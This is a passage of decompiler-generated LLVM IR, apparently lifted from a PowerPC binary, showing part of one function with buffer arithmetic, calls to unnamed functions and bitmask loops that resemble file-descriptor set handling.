  %v0_10007548 = load i32, i32* %r29.global-to-local, align 4
  %v1_10007548 = urem i32 %v0_10007548, 256
  store i32 %v1_10007548, i32* %r29.global-to-local, align 4
  %v2_10007540 = srem i32 10, %v2_10007534
  %v0_10007550 = load i32, i32* @r27, align 4
  store i32 %v2_10007540, i32* %r0.global-to-local, align 4
  %v2_10007558 = add i32 %v0_10007550, %v2_10007540
  %v3_10007558 = inttoptr i32 %v2_10007558 to i8*
  %v4_10007558 = load i8, i8* %v3_10007558, align 1
  %v5_10007558 = zext i8 %v4_10007558 to i32
  %v1_10007560 = sub nuw nsw i32 -1, %v5_10007558
  store i32 %v1_10007560, i32* %r9.global-to-local, align 4
  %v2_10007568 = add nsw i32 %v1_10007548, %v1_10007560
  store i32 %v2_10007568, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10007570.148 to i32), i32* @lr, align 4
  %v1_1000756c = inttoptr i32 %v0_10007550 to i8*
  %v2_1000756c = call i32 @function_1000ab64(i8* %v1_1000756c)
  %v0_10007574 = load i32, i32* %r29.global-to-local, align 4
  %v1_10007574 = urem i32 %v0_10007574, 256
  store i32 %v1_10007574, i32* %r29.global-to-local, align 4
  %v2_10007578 = srem i32 12, %v2_1000756c
  store i32 %v2_10007578, i32* %r0.global-to-local, align 4
  %v0_1000758c = load i32, i32* @r27, align 4
  %v2_1000758c = add i32 %v0_1000758c, %v2_10007578
  %v3_1000758c = inttoptr i32 %v2_1000758c to i8*
  %v4_1000758c = load i8, i8* %v3_1000758c, align 1
  %v5_1000758c = zext i8 %v4_1000758c to i32
  %v1_10007590 = sub nuw nsw i32 -1, %v5_1000758c
  store i32 %v1_10007590, i32* %r9.global-to-local, align 4
  %v2_10007594 = add i32 %v0_10007574, %v1_10007590
  %v1_10007598 = urem i32 %v2_10007594, 256
  %v1_100075a0 = urem i32 %v1_10007598, 9
  store i32 %v1_100075a0, i32* %r29.global-to-local, align 4
  %v1_100075ac = call i32 @__asm_rlwinm(i32 %v1_100075a0, i32 2, i32 22, i32 29)
  %v1_100075b0 = load i32, i32* @r26, align 4
  %v2_100075b0 = add i32 %v1_100075b0, %v1_100075ac
  store i32 %v2_100075b0, i32* %r29.global-to-local, align 4
  %v1_100075b4 = add i32 %v2_100075b0, 136
  %v2_100075b4 = inttoptr i32 %v1_100075b4 to i32*
  %v3_100075b4 = load i32, i32* %v2_100075b4, align 4
  store i32 %v3_100075b4, i32* %r29.global-to-local, align 4
  store i32 %v3_100075b4, i32* %ctr.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_100075b4)
  %v0_100075c4 = load i32, i32* @r27, align 4
  %v2_100075c8 = inttoptr i32 %v0_100075c4 to i8*
  %v3_100075c8 = call i32 @function_1000afc0(i8* %v2_100075c8, i32 %v2_10007454)
  store i32 18, i32* @r4, align 4
  store i32 %v3_100075c8, i32* %r29.global-to-local, align 4
  %v2_100075d4 = ptrtoint i8** %stack_var_-1604 to i32
  store i32 %v2_100075d4, i32* @r3, align 4
  store i32 268465628, i32* @lr, align 4
  %v0_100075d8 = call i32 @function_1000ac0c()
  %v0_100075dc = load i32, i32* %r29.global-to-local, align 4
  %v1_100075dc = urem i32 %v0_100075dc, 256
  store i32 %v1_100075dc, i32* @r29, align 4
  store i32 %v2_10007454, i32* @r3, align 4
  store i32 12, i32* @r4, align 4
  store i32 268465644, i32* @lr, align 4
  %v0_100075e8 = call i32 @function_1000ac0c()
  %v0_100075ec = load i32, i32* @r29, align 4
  %v3_100075ec = icmp eq i32 %v0_100075ec, 0
  br i1 %v3_100075ec, label %dec_label_pc_100075f4, label %dec_label_pc_10007758

dec_label_pc_100075f4:                            ; preds = %dec_label_pc_10007440, %dec_label_pc_1000737c
  %v2_100075f4 = ptrtoint i32* %stack_var_-1586 to i32
  store i32 %v2_100075f4, i32* @r25, align 4
  store i32 ptrtoint (i32* @global_var_100075fc.149 to i32), i32* @lr, align 4
  %v0_100075f8 = call i32 @function_10006fec()
  store i32 268465664, i32* @lr, align 4
  %v1_100075fc = call i32 @function_10007cf8(i32 %v0_100075f8)
  store i32 %v2_100075f4, i32* @r3, align 4
  store i32 32, i32* @r4, align 4
  store i32 268465676, i32* @lr, align 4
  %v0_10007608 = call i32 @function_1000ac0c()
  %v0_1000760c = load i32, i32* @r30, align 4
  %v3_1000760c = icmp eq i32 %v0_1000760c, 2
  br i1 %v3_1000760c, label %dec_label_pc_10007780, label %dec_label_pc_10007614

dec_label_pc_10007614:                            ; preds = %dec_label_pc_10007758, %dec_label_pc_10007780, %dec_label_pc_100075f4, %dec_label_pc_10007790
  %v0_10007614 = call i32 @function_10007ca8()
  %v2_10007618 = ptrtoint i32* %stack_var_-1554 to i32
  store i32 %v2_10007618, i32* @r28, align 4
  %v1_1000761c = call i32 @__asm_rlwinm(i32 %v0_10007614, i32 2, i32 28, i32 29)
  store i32 0, i32* @r27, align 4
  %v1_10007624 = add i32 %v1_1000761c, 12
  %v0_10007630 = load i32, i32* @r26, align 4
  %v2_10007630 = add i32 %v0_10007630, %v1_10007624
  store i32 %v2_10007630, i32* @r29, align 4
  store i32 268465720, i32* @lr, align 4
  %v2_10007634 = bitcast i32* %stack_var_-1554 to i8*
  %v3_10007634 = call i32 @function_10007d68(i8* %v2_10007634, i32 %v1_10007624)
  %v0_10007638 = load i32, i32* @r31, align 4
  %v1_10007638 = inttoptr i32 %v0_10007638 to i32*
  %v2_10007638 = load i32, i32* %v1_10007638, align 4
  store i32 %v2_10007638, i32* @r3, align 4
  %v0_1000763c = load i32, i32* @r27, align 4
  %v1_1000763c = trunc i32 %v0_1000763c to i8
  %v2_1000763c = load i32, i32* @r29, align 4
  %v3_1000763c = add i32 %v2_1000763c, 102
  %v4_1000763c = inttoptr i32 %v3_1000763c to i8*
  store i8 %v1_1000763c, i8* %v4_1000763c, align 1
  %v2_10007644 = inttoptr i32 %v2_10007638 to i8*
  %v3_10007644 = call i32 @function_1000ab8c(i8* %v2_10007644, i32 %v2_10007618)
  %v0_10007648 = call i32 @function_10007ca8()
  %v1_10007648 = sext i32 %v0_10007648 to i64
  %v5_10007658 = mul nuw nsw i64 %v1_10007648, 2863311531
  %v1_100076605 = udiv i64 %v5_10007658, 17179869184
  %v1_10007660 = trunc i64 %v1_100076605 to i32
  %v1_10007664 = mul i32 %v1_10007660, 6
  store i32 %v1_10007664, i32* %r0.global-to-local, align 4
  %v2_10007668 = sub i32 %v0_10007648, %v1_10007664
  %v1_1000766c = mul i32 %v2_10007668, 4
  %v1_10007670 = add i32 %v1_1000766c, 12
  %v0_10007678 = load i32, i32* @r26, align 4
  %v2_10007678 = add i32 %v1_10007670, %v0_10007678
  store i32 %v2_10007678, i32* @r29, align 4
  store i32 268465792, i32* @lr, align 4
  %v3_1000767c = call i32 @function_10007d68(i8* %v2_10007634, i32 %v1_10007670)
  %v0_10007680 = load i32, i32* @r27, align 4
  %v1_10007680 = trunc i32 %v0_10007680 to i8
  %v2_10007680 = load i32, i32* @r29, align 4
  %v3_10007680 = add i32 %v2_10007680, 102
  %v4_10007680 = inttoptr i32 %v3_10007680 to i8*
  store i8 %v1_10007680, i8* %v4_10007680, align 1
  store i32 ptrtoint ([3 x i8]* @global_var_10007694.152 to i32), i32* @lr, align 4
  %v2_10007690 = call i32 @function_1000b5e0(i32 15, i32 %v2_10007618)
  store i32 268465820, i32* @lr, align 4
  %v1_10007698 = call i32 @function_1000a2ec(i32 2)
  %v3_100076a4 = call i32 @function_1000a238(i32 2, i32* nonnull %stack_var_-1652)
  %v3_100076a8 = load i32, i32* %stack_var_-1652, align 4
  store i32 %v3_100076a8, i32* %r5.global-to-local, align 4
  store i32 268465848, i32* @lr, align 4
  %v3_100076b4 = call i32 @function_1000b850(i32 1, i32 %v3_100076a4, i32 %v3_100076a8)
  store i32 1, i32* %r5.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100076cc.154 to i32), i32* @lr, align 4
  %v3_100076c8 = call i32 @function_1000b850(i32 1, i32 ptrtoint (i32* @global_var_1000ded0.153 to i32), i32 1)
  store i32 ptrtoint (i32* @global_var_100076d4.155 to i32), i32* @lr, align 4
  %v1_100076d0 = call i32 @function_1000a260(i32 2)
  store i32 268465880, i32* @lr, align 4
  %v0_100076d4 = call i32 @function_1000b438()
  %tmp80 = icmp slt i32 %v0_100076d4, 1
  br i1 %tmp80, label %dec_label_pc_100077b8, label %dec_label_pc_100076e0

dec_label_pc_100076e0:                            ; preds = %dec_label_pc_10007614
  store i32 %v0_10007294, i32* %r0.global-to-local, align 4
  store i32 %v0_100072a8, i32* %r29.global-to-local, align 4
  ret i32 0

dec_label_pc_10007734:                            ; preds = %dec_label_pc_10007294
  store i32 268465992, i32* @lr, align 4
  %v3_10007744 = call i32 @function_1000b558(i32 ptrtoint ([19 x i8]* @global_var_1000debc.156 to i32), i32 2)
  %v3_10007748 = icmp eq i32 %v3_10007744, -1
  store i32 %v3_10007744, i32* @r29, align 4
  br i1 %v3_10007748, label %dec_label_pc_1000737c, label %dec_label_pc_10007354

dec_label_pc_10007758:                            ; preds = %dec_label_pc_10007440
  %v2_1000775c = ptrtoint i32* %stack_var_-1586 to i32
  store i32 %v2_1000775c, i32* @r25, align 4
  store i32 268466020, i32* @lr, align 4
  %v1_10007760 = call i32 @function_1000c1f0(i32 5)
  store i32 ptrtoint (i32* @global_var_10007768.157 to i32), i32* @lr, align 4
  %v0_10007764 = call i32 @function_10006fec()
  store i32 268466028, i32* @lr, align 4
  %v1_10007768 = call i32 @function_10007cf8(i32 %v0_10007764)
  store i32 %v2_1000775c, i32* @r3, align 4
  store i32 32, i32* @r4, align 4
  store i32 268466040, i32* @lr, align 4
  %v0_10007774 = call i32 @function_1000ac0c()
  %v0_10007778 = load i32, i32* @r30, align 4
  %v3_10007778 = icmp eq i32 %v0_10007778, 2
  br i1 %v3_10007778, label %dec_label_pc_10007780, label %dec_label_pc_10007614

dec_label_pc_10007780:                            ; preds = %dec_label_pc_10007758, %dec_label_pc_100075f4
  %v0_10007780 = load i32, i32* @r31, align 4
  %v1_10007780 = add i32 %v0_10007780, 4
  %v2_10007780 = inttoptr i32 %v1_10007780 to i32*
  %v3_10007780 = load i32, i32* %v2_10007780, align 4
  store i32 268466056, i32* @lr, align 4
  %v1_10007784 = inttoptr i32 %v3_10007780 to i8*
  %v2_10007784 = call i32 @function_1000ab64(i8* %v1_10007784)
  %v2_10007788 = icmp sgt i32 %v2_10007784, 31
  br i1 %v2_10007788, label %dec_label_pc_10007614, label %dec_label_pc_10007790

dec_label_pc_10007790:                            ; preds = %dec_label_pc_10007780
  %v0_10007790 = load i32, i32* @r31, align 4
  %v1_10007790 = add i32 %v0_10007790, 4
  %v2_10007790 = inttoptr i32 %v1_10007790 to i32*
  %v3_10007790 = load i32, i32* %v2_10007790, align 4
  %v1_10007794 = ptrtoint i32* %stack_var_-1586 to i32
  store i32 %v1_10007794, i32* @r3, align 4
  %v2_10007798 = bitcast i32* %stack_var_-1586 to i8*
  %v3_10007798 = call i32 @function_1000ab8c(i8* %v2_10007798, i32 %v3_10007790)
  %v0_1000779c = load i32, i32* @r31, align 4
  %v1_1000779c = add i32 %v0_1000779c, 4
  %v2_1000779c = inttoptr i32 %v1_1000779c to i32*
  %v3_1000779c = load i32, i32* %v2_1000779c, align 4
  store i32 %v3_1000779c, i32* %r29.global-to-local, align 4
  store i32 268466088, i32* @lr, align 4
  %v1_100077a4 = inttoptr i32 %v3_1000779c to i8*
  %v2_100077a4 = call i32 @function_1000ab64(i8* %v1_100077a4)
  store i32 %v2_100077a4, i32* @r4, align 4
  %v0_100077ac = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_100077ac, i32* @r3, align 4
  store i32 268466100, i32* @lr, align 4
  %v0_100077b0 = call i32 @function_1000ac0c()
  br label %dec_label_pc_10007614

dec_label_pc_100077b8:                            ; preds = %dec_label_pc_10007614
  store i32 268466108, i32* @lr, align 4
  %v1_100077b8 = call i32 @function_1000b700(i32 %v0_100076d4)
  store i32 0, i32* @r20, align 4
  store i32 %v1_100077b8, i32* @r18, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100077cc.158 to i32), i32* @lr, align 4
  %v0_100077c8 = call i32 @function_1000b3f0()
  store i32 ptrtoint ([3 x i8]* @global_var_100077d4.159 to i32), i32* @lr, align 4
  %v0_100077d0 = call i32 @function_1000b3f0()
  store i32 ptrtoint ([3 x i8]* @global_var_100077dc.160 to i32), i32* @lr, align 4
  %v0_100077d8 = call i32 @function_1000b3f0()
  %v2_100077dc = ptrtoint i32* %stack_var_-1648 to i32
  store i32 268466148, i32* @lr, align 4
  %v1_100077e0 = call i32 @function_100023e0(i32 %v0_100077d8)
  %v2_100077e4 = ptrtoint i32* %stack_var_-1228 to i32
  store i32 %v2_100077e4, i32* @r29, align 4
  store i32 268466156, i32* @lr, align 4
  %v1_100077e8 = call i32 @function_1000680c(i32 %v1_100077e0)
  %v2_100077ec = ptrtoint i32* %stack_var_-1484 to i32
  store i32 %v2_100077ec, i32* @r28, align 4
  store i32 268466164, i32* @lr, align 4
  %v0_100077f0 = call i32 @function_10008804()
  store i32 268566528, i32* @r27, align 4
  %v2_10007800 = ptrtoint i32* %stack_var_-1640 to i32
  store i32 %v2_10007800, i32* @r16, align 4
  %v2_10007a58 = ptrtoint i32* %stack_var_-1100 to i32
  %v2_10007b50 = ptrtoint i32* %stack_var_-1644 to i32
  %v1_10007bd8 = ptrtoint i32* %stack_var_-1586 to i32
  %v1_10007bdc = bitcast i32* %stack_var_-1586 to i8*
  %v2_10007bac = ptrtoint i32* %stack_var_-1620 to i32
  br label %dec_label_pc_10007804

dec_label_pc_10007804:                            ; preds = %dec_label_pc_10007c44, %dec_label_pc_100079dc, %dec_label_pc_100079cc, %dec_label_pc_100078bc, %dec_label_pc_10007c68, %dec_label_pc_10007c38, %dec_label_pc_10007bd8, %dec_label_pc_10007a90, %dec_label_pc_10007990, %dec_label_pc_10007c9c, %dec_label_pc_10007c50, %dec_label_pc_10007c24, %dec_label_pc_10007b6c, %dec_label_pc_100077b8
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000781482 = load i32, i32* @r29, align 4
  %v4_1000781484 = inttoptr i32 %v2_1000781482 to i32*
  store i32 0, i32* %v4_1000781484, align 4
  %v0_1000781885 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000781886 = add i32 %v0_1000781885, 4
  store i32 %v1_1000781886, i32* %r9.global-to-local, align 4
  %v0_1000781c87 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000781c88 = add i32 %v0_1000781c87, -1
  store i32 %v1_1000781c88, i32* %ctr.global-to-local, align 4
  %v2_1000781c89 = icmp eq i32 %v1_1000781c88, 0
  br i1 %v2_1000781c89, label %dec_label_pc_10007820, label %dec_label_pc_10007814.dec_label_pc_10007814_crit_edge

dec_label_pc_10007814.dec_label_pc_10007814_crit_edge: ; preds = %dec_label_pc_10007804, %dec_label_pc_10007814.dec_label_pc_10007814_crit_edge
  %v1_1000781890 = phi i32 [ %v1_10007818, %dec_label_pc_10007814.dec_label_pc_10007814_crit_edge ], [ %v1_1000781886, %dec_label_pc_10007804 ]
  %v0_10007814.pre = load i32, i32* %r0.global-to-local, align 4
  %v2_10007814 = load i32, i32* @r29, align 4
  %v3_10007814 = add i32 %v2_10007814, %v1_1000781890
  %v4_10007814 = inttoptr i32 %v3_10007814 to i32*
  store i32 %v0_10007814.pre, i32* %v4_10007814, align 4
  %v0_10007818 = load i32, i32* %r9.global-to-local, align 4
  %v1_10007818 = add i32 %v0_10007818, 4
  store i32 %v1_10007818, i32* %r9.global-to-local, align 4
  %v0_1000781c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000781c = add i32 %v0_1000781c, -1
  store i32 %v1_1000781c, i32* %ctr.global-to-local, align 4
  %v2_1000781c = icmp eq i32 %v1_1000781c, 0
  br i1 %v2_1000781c, label %dec_label_pc_10007820, label %dec_label_pc_10007814.dec_label_pc_10007814_crit_edge

dec_label_pc_10007820:                            ; preds = %dec_label_pc_10007814.dec_label_pc_10007814_crit_edge, %dec_label_pc_10007804
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000783091 = load i32, i32* @r28, align 4
  %v4_1000783093 = inttoptr i32 %v2_1000783091 to i32*
  store i32 0, i32* %v4_1000783093, align 4
  %v0_1000783494 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000783495 = add i32 %v0_1000783494, 4
  store i32 %v1_1000783495, i32* %r9.global-to-local, align 4
  %v0_1000783896 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000783897 = add i32 %v0_1000783896, -1
  store i32 %v1_1000783897, i32* %ctr.global-to-local, align 4
  %v2_1000783898 = icmp eq i32 %v1_1000783897, 0
  br i1 %v2_1000783898, label %dec_label_pc_1000783c, label %dec_label_pc_10007830.dec_label_pc_10007830_crit_edge

dec_label_pc_10007830.dec_label_pc_10007830_crit_edge: ; preds = %dec_label_pc_10007820, %dec_label_pc_10007830.dec_label_pc_10007830_crit_edge
  %v1_1000783499 = phi i32 [ %v1_10007834, %dec_label_pc_10007830.dec_label_pc_10007830_crit_edge ], [ %v1_1000783495, %dec_label_pc_10007820 ]
  %v0_10007830.pre = load i32, i32* %r0.global-to-local, align 4
  %v2_10007830 = load i32, i32* @r28, align 4
  %v3_10007830 = add i32 %v2_10007830, %v1_1000783499
  %v4_10007830 = inttoptr i32 %v3_10007830 to i32*
  store i32 %v0_10007830.pre, i32* %v4_10007830, align 4
  %v0_10007834 = load i32, i32* %r9.global-to-local, align 4
  %v1_10007834 = add i32 %v0_10007834, 4
  store i32 %v1_10007834, i32* %r9.global-to-local, align 4
  %v0_10007838 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10007838 = add i32 %v0_10007838, -1
  store i32 %v1_10007838, i32* %ctr.global-to-local, align 4
  %v2_10007838 = icmp eq i32 %v1_10007838, 0
  br i1 %v2_10007838, label %dec_label_pc_1000783c, label %dec_label_pc_10007830.dec_label_pc_10007830_crit_edge

dec_label_pc_1000783c:                            ; preds = %dec_label_pc_10007830.dec_label_pc_10007830_crit_edge, %dec_label_pc_10007820
  %v3_1000783c = load i32, i32* @global_var_1001eaf0.125, align 4
  %v3_10007840 = icmp eq i32 %v3_1000783c, -1
  br i1 %v3_10007840, label %dec_label_pc_10007868, label %dec_label_pc_10007848

dec_label_pc_10007848:                            ; preds = %dec_label_pc_1000783c
  %v1_10007848 = call i32 @__asm_rlwinm(i32 %v3_1000783c, i32 29, i32 3, i32 29)
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10007850 = load i32, i32* @r26, align 4
  %v2_10007850 = add i32 %v1_10007850, %v1_10007848
  %v1_10007854 = urem i32 %v3_1000783c, 32
  %v1_10007858 = add i32 %v2_10007850, 428
  %v2_10007858 = inttoptr i32 %v1_10007858 to i32*
  %v3_10007858 = load i32, i32* %v2_10007858, align 4
  %v3_1000785c = shl i32 1, %v1_10007854
  store i32 %v3_1000785c, i32* %r0.global-to-local, align 4
  %v2_10007860 = or i32 %v3_10007858, %v3_1000785c
  store i32 %v2_10007860, i32* %r9.global-to-local, align 4
  store i32 %v2_10007860, i32* %v2_10007858, align 4
  br label %dec_label_pc_10007868

dec_label_pc_10007868:                            ; preds = %dec_label_pc_1000783c, %dec_label_pc_10007848
  %v3_10007868 = load i32, i32* @global_var_1001eaf4.161, align 4
  store i32 %v3_10007868, i32* %r0.global-to-local, align 4
  store i32 268566528, i32* @r30, align 4
  %v3_10007870 = icmp eq i32 %v3_10007868, -1
  br i1 %v3_10007870, label %dec_label_pc_10007aa8, label %dec_label_pc_10007878

dec_label_pc_10007878:                            ; preds = %dec_label_pc_10007aa8, %dec_label_pc_10007868, %dec_label_pc_10007b04
  %v3_100079a4 = phi i32 [ -1, %dec_label_pc_10007aa8 ], [ %v3_10007868, %dec_label_pc_10007868 ], [ %v3_100079a4.pre, %dec_label_pc_10007b04 ]
  %v3_10007878 = load i8, i8* @global_var_1001eb28.162, align 1
  %v3_1000787c = icmp eq i8 %v3_10007878, 0
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_100079ac = call i32 @__asm_rlwinm(i32 %v3_100079a4, i32 29, i32 3, i32 29)
  %v1_100079b0 = urem i32 %v3_100079a4, 32
  %v1_100079b4 = load i32, i32* @r26, align 4
  %v2_100079b4 = add i32 %v1_100079b4, %v1_100079ac
  %v0_100079b8 = load i32, i32* %r0.global-to-local, align 4
  %v3_100079b8 = shl i32 %v0_100079b8, %v1_100079b0
  store i32 %v3_100079b8, i32* %r0.global-to-local, align 4
  br i1 %v3_1000787c, label %dec_label_pc_100079a4, label %dec_label_pc_10007884

dec_label_pc_10007884:                            ; preds = %dec_label_pc_10007878
  %v1_1000789c = add i32 %v2_100079b4, 172
  %v2_1000789c = inttoptr i32 %v1_1000789c to i32*
  %v3_1000789c = load i32, i32* %v2_1000789c, align 4
  %v2_100078a0 = or i32 %v3_1000789c, %v3_100079b8
  store i32 %v2_100078a0, i32* %r9.global-to-local, align 4
  store i32 %v2_100078a0, i32* %v2_1000789c, align 4
  br label %dec_label_pc_100078a8

dec_label_pc_100078a8:                            ; preds = %dec_label_pc_100079a4, %dec_label_pc_10007884
  %v3_100078a8 = load i32, i32* @global_var_1001eaf4.161, align 4
  store i32 %v3_100078a8, i32* %r0.global-to-local, align 4
  %v3_100078ac = load i32, i32* @global_var_1001eaf0.125, align 4
  %v2_100078b0 = icmp slt i32 %v3_100078ac, %v3_100078a8
  br i1 %v2_100078b0, label %dec_label_pc_100078b8, label %dec_label_pc_100078bc

dec_label_pc_100078b8:                            ; preds = %dec_label_pc_100078a8
  br label %dec_label_pc_100078bc

dec_label_pc_100078bc:                            ; preds = %dec_label_pc_100078a8, %dec_label_pc_100078b8
  %v0_100078c4 = phi i32 [ %v3_100078ac, %dec_label_pc_100078a8 ], [ %v3_100078a8, %dec_label_pc_100078b8 ]
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r9.global-to-local, align 4
  %v1_100078c4 = add i32 %v0_100078c4, 1
  store i32 %v2_100077ec, i32* %r5.global-to-local, align 4
  store i32 10, i32* %stack_var_-1640, align 4
  store i32 268466404, i32* @lr, align 4
  %v5_100078e0 = call i32 @function_1000b6b8(i32 %v1_100078c4, i32 %v2_100077e4, i32 %v2_100077ec, i32 0, i32 %v2_10007800)
  %v6_100078e0 = trunc i32 %v5_100078e0 to i16
  %v4_100078e4 = icmp eq i16 %v6_100078e0, -1
  br i1 %v4_100078e4, label %dec_label_pc_10007804, label %dec_label_pc_100078ec

dec_label_pc_100078ec:                            ; preds = %dec_label_pc_100078bc
  %v4_100078ec = icmp eq i16 %v6_100078e0, 0
  br i1 %v4_100078ec, label %dec_label_pc_100078f4, label %dec_label_pc_10007920

dec_label_pc_100078f4:                            ; preds = %dec_label_pc_100078ec
  %v0_100078f8 = load i32, i32* @r20, align 4
  store i16 0, i16* %stack_var_-1656, align 2
  %v2_10007908 = srem i32 %v0_100078f8, 6
  %v1_1000790c = sub i32 %v0_100078f8, %v2_10007908
  store i32 %v1_1000790c, i32* %r9.global-to-local, align 4
  store i32 %v2_10007908, i32* %r0.global-to-local, align 4
  %v1_10007914 = add i32 %v0_100078f8, 1
  store i32 %v1_10007914, i32* @r20, align 4
  %v3_10007918 = icmp eq i32 %v2_10007908, 0
  br i1 %v3_10007918, label %dec_label_pc_10007b20, label %dec_label_pc_10007920

dec_label_pc_10007920:                            ; preds = %dec_label_pc_100078ec, %dec_label_pc_100078f4, %dec_label_pc_10007b20
  %v3_10007920 = load i32, i32* @global_var_1001eaf0.125, align 4
  %v3_10007924 = icmp eq i32 %v3_10007920, -1
  br i1 %v3_10007924, label %dec_label_pc_10007948, label %dec_label_pc_1000792c

dec_label_pc_1000792c:                            ; preds = %dec_label_pc_10007920
  %v1_1000792c = call i32 @__asm_rlwinm(i32 %v3_10007920, i32 29, i32 3, i32 29)
  %v1_10007930 = urem i32 %v3_10007920, 32
  %v1_10007934 = load i32, i32* @r26, align 4
  %v2_10007934 = add i32 %v1_10007934, %v1_1000792c
  store i32 %v2_10007934, i32* %r9.global-to-local, align 4
  %v1_10007938 = add i32 %v2_10007934, 428
  %v2_10007938 = inttoptr i32 %v1_10007938 to i32*
  %v3_10007938 = load i32, i32* %v2_10007938, align 4
  %v3_1000793c = lshr i32 %v3_10007938, %v1_10007930
  store i32 %v3_1000793c, i32* %r0.global-to-local, align 4
  %v1_10007940 = urem i32 %v3_1000793c, 2
  store i32 %v1_10007940, i32* %r9.global-to-local, align 4
  %v3_10007940 = icmp eq i32 %v1_10007940, 0
  br i1 %v3_10007940, label %dec_label_pc_10007948, label %dec_label_pc_10007ba4

dec_label_pc_10007948:                            ; preds = %dec_label_pc_1000792c, %dec_label_pc_10007920
  %v3_10007948 = load i8, i8* @global_var_1001eb28.162, align 1
  %v4_10007948 = zext i8 %v3_10007948 to i32
  store i32 %v4_10007948, i32* @r31, align 4
  %v3_1000794c = icmp eq i8 %v3_10007948, 0
  %v3_100079cc = load i32, i32* @global_var_1001eaf4.161, align 4
  br i1 %v3_1000794c, label %dec_label_pc_100079cc, label %dec_label_pc_10007954

dec_label_pc_10007954:                            ; preds = %dec_label_pc_10007948
  store i32 268566528, i32* @r31, align 4
  %v1_1000795c = call i32 @__asm_rlwinm(i32 %v3_100079cc, i32 29, i32 3, i32 29)
  %v1_10007960 = urem i32 %v3_100079cc, 32
  %v1_10007964 = load i32, i32* @r26, align 4
  %v2_10007964 = add i32 %v1_10007964, %v1_1000795c
  store i32 %v2_10007964, i32* %r9.global-to-local, align 4
  %v1_10007968 = add i32 %v2_10007964, 172
  %v2_10007968 = inttoptr i32 %v1_10007968 to i32*
  %v3_10007968 = load i32, i32* %v2_10007968, align 4
  %v3_1000796c = lshr i32 %v3_10007968, %v1_10007960
  store i32 %v3_1000796c, i32* %r0.global-to-local, align 4
  %v1_10007974 = urem i32 %v3_1000796c, 2
  %v3_10007974 = icmp eq i32 %v1_10007974, 0
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i8 0, i8* @global_var_1001eb28.162, align 1
  br i1 %v3_10007974, label %dec_label_pc_10007984, label %dec_label_pc_10007b3c

dec_label_pc_10007984:                            ; preds = %dec_label_pc_10007954
  %v3_10007984 = icmp eq i32 %v3_100079cc, -1
  br i1 %v3_10007984, label %dec_label_pc_10007990, label %dec_label_pc_1000798c

dec_label_pc_1000798c:                            ; preds = %dec_label_pc_10007984
  store i32 ptrtoint (i32* @global_var_10007990.163 to i32), i32* @lr, align 4
  %v0_1000798c = call i32 @function_1000b3f0()
  br label %dec_label_pc_10007990

dec_label_pc_10007990:                            ; preds = %dec_label_pc_10007984, %dec_label_pc_1000798c
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 -1, i32* @global_var_1001eaf4.161, align 4
  store i32 268466592, i32* @lr, align 4
  %v1_1000799c = call i32 @function_1000cce4(i32 1)
  br label %dec_label_pc_10007804

dec_label_pc_100079a4:                            ; preds = %dec_label_pc_10007878
  %v1_100079bc = add i32 %v2_100079b4, 428
  %v2_100079bc = inttoptr i32 %v1_100079bc to i32*
  %v3_100079bc = load i32, i32* %v2_100079bc, align 4
  %v2_100079c0 = or i32 %v3_100079bc, %v3_100079b8
  store i32 %v2_100079c0, i32* %r9.global-to-local, align 4
  store i32 %v2_100079c0, i32* %v2_100079bc, align 4
  br label %dec_label_pc_100078a8

dec_label_pc_100079cc:                            ; preds = %dec_label_pc_10007948
  store i32 268566528, i32* @r30, align 4
  %v3_100079d4 = icmp eq i32 %v3_100079cc, -1
  br i1 %v3_100079d4, label %dec_label_pc_10007804, label %dec_label_pc_100079dc

dec_label_pc_100079dc:                            ; preds = %dec_label_pc_100079cc
  %v1_100079dc = call i32 @__asm_rlwinm(i32 %v3_100079cc, i32 29, i32 3, i32 29)
  %v1_100079e0 = urem i32 %v3_100079cc, 32
  %v1_100079e4 = load i32, i32* @r26, align 4
  %v2_100079e4 = add i32 %v1_100079e4, %v1_100079dc
  store i32 %v2_100079e4, i32* %r9.global-to-local, align 4
  %v1_100079e8 = add i32 %v2_100079e4, 428
  %v2_100079e8 = inttoptr i32 %v1_100079e8 to i32*
  %v3_100079e8 = load i32, i32* %v2_100079e8, align 4
  %v3_100079ec = lshr i32 %v3_100079e8, %v1_100079e0
  store i32 %v3_100079ec, i32* %r0.global-to-local, align 4
  %v1_100079f0 = urem i32 %v3_100079ec, 2
  store i32 %v1_100079f0, i32* %r9.global-to-local, align 4
  %v3_100079f0 = icmp eq i32 %v1_100079f0, 0
  br i1 %v3_100079f0, label %dec_label_pc_10007804, label %dec_label_pc_100079f8

dec_label_pc_100079f8:                            ; preds = %dec_label_pc_100079dc
  %v0_100079f8 = call i32 @function_1000bb0c()
  %v0_10007a00 = load i32, i32* @r31, align 4
  %v2_10007a00 = inttoptr i32 %v0_100079f8 to i32*
  store i32 %v0_10007a00, i32* %v2_10007a00, align 4
  store i32 %v0_100079f8, i32* @r23, align 4
  store i32 2, i32* %r5.global-to-local, align 4
  %v3_10007a10 = load i32, i32* @global_var_1001eaf4.161, align 4
  store i32 268466712, i32* @lr, align 4
  %v4_10007a14 = call i32 @function_1000c090(i32 %v3_10007a10, i32 %v2_10007390, i32 2, i32 16386)
  %v3_10007a18 = icmp eq i32 %v4_10007a14, -1
  br i1 %v3_10007a18, label %dec_label_pc_10007c38, label %dec_label_pc_10007a20

dec_label_pc_10007a20:                            ; preds = %dec_label_pc_100079f8
